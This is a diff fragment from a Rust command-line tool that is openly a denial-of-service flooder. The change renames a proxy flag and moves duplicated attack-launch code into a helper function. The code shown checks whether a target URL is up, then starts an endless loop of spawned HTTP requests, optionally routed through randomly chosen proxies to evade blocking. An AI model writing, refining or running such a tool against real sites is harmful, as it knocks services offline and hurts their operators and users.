@@ -35,7 +35,7 @@ struct Args {
 struct DenialOfService {
     url: String,
     spawned_requests: AtomicU128,
-    use_proxy: bool,
+    activate_proxy: bool,
 }
 
 impl DenialOfService {
@@ -52,7 +52,7 @@ impl DenialOfService {
         loop {
             let self_cloned = self.clone();
 
-            if self_cloned.use_proxy {
+            if self_cloned.activate_proxy {
                 let taken_proxy = take_random_proxy(proxies.clone());
                 tokio::spawn(async move {
                     match reqwest::Proxy::http(taken_proxy.clone()) {
@@ -166,44 +166,32 @@ async fn website_is_up(url: String) -> Result<(), WebsiteError> {
     }
 }
 
+async fn start_denial_of_service(url: String, activate_proxy: bool) {
+    display_time();
+    println!("{} {}", "DoS is running at".green(), url.clone().bold());
+    Arc::new(DenialOfService {
+        url: url.clone(),
+        spawned_requests: AtomicU128::new(0),
+        activate_proxy,
+    })
+    .attack()
+    .await
+}
+
 #[tokio::main]
 async fn main() {
     let args = Args::parse();
 
     let website_url = args.url;
-    let proxy = args.proxy;
+    let activate_proxy = args.proxy;
 
     if args.force {
-        display_time();
-        println!(
-            "{} {}",
-            "DoS is running at".green(),
-            website_url.clone().bold()
-        );
-        Arc::new(DenialOfService {
-            url: website_url.clone(),
-            spawned_requests: AtomicU128::new(0),
-            use_proxy: proxy,
-        })
-        .attack()
-        .await
+        start_denial_of_service(website_url.clone(), activate_proxy).await;
     }
 
     match website_is_up(website_url.clone()).await {
         Ok(()) => {
-            display_time();
-            println!(
-                "{} {}",
-                "DoS is running at".green(),
-                website_url.clone().bold()
-            );
-            Arc::new(DenialOfService {
-                url: website_url,
-                spawned_requests: AtomicU128::new(0),
-                use_proxy: proxy,
-            })
-            .attack()
-            .await
+            start_denial_of_service(website_url.clone(), activate_proxy).await;
         }
         Err(WebsiteError::WebsiteUnaccessible) => {
             display_time();
